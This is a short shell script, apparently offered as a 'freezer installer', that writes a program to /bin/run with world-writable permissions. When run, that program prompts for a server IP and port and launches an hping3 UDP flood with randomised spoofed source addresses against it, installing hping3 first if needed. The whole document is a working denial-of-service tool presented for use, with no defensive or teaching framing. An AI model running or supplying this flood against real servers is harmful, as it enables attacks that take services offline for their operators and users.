echo "freezer installer by faizii if not work check for update at github"
printf "
echo checking  essential package is installed.
sleep 1
if  hping3 -h |grep dump |grep hex
then
echo what is the server ip?
read r
echo what is the server port?
read p
clear
echo ip = $r port =$p
echo attack started 
hping3 -2 --flood --rand-source  $r -p $p
else
echo hping3 not found installing hping3
echo you can manually install hping3 with
echo pkg install hping3
pkg install hping3
fi
" >/bin/run

chmod 777 /bin/run
